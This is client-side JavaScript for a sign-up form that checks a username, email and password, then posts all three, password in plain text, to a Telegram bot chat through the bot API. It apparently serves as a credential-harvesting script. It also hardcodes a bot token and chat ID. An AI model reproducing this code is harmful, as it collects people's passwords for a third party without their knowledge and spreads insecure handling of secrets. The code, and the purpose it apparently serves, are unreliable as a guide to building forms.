const token = '6157565081:AAFSoh7I5PqlU9KVRUBOSZTKtNB180yJTc4',
	chatID = '-1001975703464',
	urlAPI = `https://api.telegram.org/bot${token}/sendMessage`,
	success = document.querySelector('.alert-success')

let buttonSend = document.querySelector('.btn')

const emailRegExp =
	/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu

const inputEmail = document.querySelector('input[name=email]'),
	inputName = document.querySelector('input[name=username]'),
	inputPassword = document.querySelector('input[name=password1]')

function isEmailValid(value) {
	return emailRegExp.test(value)
}

function onInputEmail() {
	if (isEmailValid(inputEmail.value)) {
		inputEmail.style.background = 'white'
		if (!isNameValid(inputName.value) || !isPasswordValid(inputPassword.value)) {
			buttonSend.setAttribute('disabled', '')
		} else {
			buttonSend.removeAttribute('disabled', '')
		}
	} else {
		inputEmail.style.background = 'red'
		buttonSend.setAttribute('disabled', '')
	}
}

inputEmail.addEventListener('input', onInputEmail)

function isPasswordValid(value) {
	return value.length > 5 && value.length < 12
}

function onInputPassword() {
	if (isPasswordValid(inputPassword.value)) {
		inputPassword.style.background = 'white'
		if (!isEmailValid(inputEmail.value) || !isNameValid(inputName.value)) {
			buttonSend.setAttribute('disabled', '')
		} else {
			buttonSend.removeAttribute('disabled', '')
		}
	} else {
		inputPassword.style.background = 'red'
		buttonSend.setAttribute('disabled', '')
	}
}

inputPassword.addEventListener('input', onInputPassword)

function isNameValid(value) {
	return value.length > 1
}

function onInputName() {
	if (isNameValid(inputName.value)) {
		inputName.style.background = 'white'
		if (!isEmailValid(inputEmail.value) || !isPasswordValid(inputPassword.value)) {
			buttonSend.setAttribute('disabled', '')
		} else {
			buttonSend.removeAttribute('disabled', '')
		}
	} else {
		inputName.style.background = 'red'
		buttonSend.setAttribute('disabled', '')
	}
}
inputName.addEventListener('input', onInputName)

if (
	!isEmailValid(inputEmail.value) ||
	!isPasswordValid(inputEmail.value) ||
	!isNameValid(inputName.value)
) {
	buttonSend.setAttribute('disabled', '')
}

let tgForm = document.querySelector('.form')
tgForm.addEventListener('submit', function (e) {
	e.preventDefault()
	//use html <b> <strong> <i> <a> <code> <pre>
	let message = `<b>Заявка с сайта:</b>\n`
	message += `<b>Отправитель:</b> ${this.username.value}\n`
	message += `<b>Email:</b> ${this.email.value}\n`
	message += `<b>Пароль:</b> ${this.password1.value}\n`

	console.log(message)

	//axios - promise

	axios
		.post(urlAPI, {
			chat_id: chatID,
			parse_mode: 'html',
			text: message,
		})
		.then((res) => {
			this.username.value = ''
			this.email.value = ''
			this.password1.value = ''
			success.innerHTML = 'Sent successfully'
			success.style.display = 'block'

			setTimeout(() => {
				success.style.display = 'none'
			}, 3000)
			//email.style.border = 'black'
		})
		.catch((err) => {
			console.warn(err)
		})
		.finally(() => {
			console.log('End')
		})
})
